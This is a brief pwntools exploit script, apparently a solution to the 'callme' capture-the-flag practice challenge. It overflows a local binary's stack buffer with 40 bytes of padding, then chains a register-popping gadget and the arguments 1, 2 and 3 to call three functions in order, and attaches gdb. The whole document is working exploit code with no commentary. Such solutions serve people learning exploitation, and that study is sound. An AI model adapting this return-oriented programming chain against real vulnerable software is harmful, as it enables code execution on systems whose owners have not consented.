from pwn import *
p=process("./callme")
p.readuntil(">")
cal1=0x000000000401850
cal2=0x0000000000401870
cal3=0x000000000401810
p3=0x0000000000401ab0
payload="A"*40+p64(p3)+p64(1)+p64(2)+p64(3)+p64(cal1)+p64(p3)+p64(1)+p64(2)+p64(3)+p64(cal2)+p64(p3)+p64(1)+p64(2)+p64(3)+p64(cal3)
gdb.attach(p)
p.sendline(payload.ljust(256,'\0'))
p.interactive()
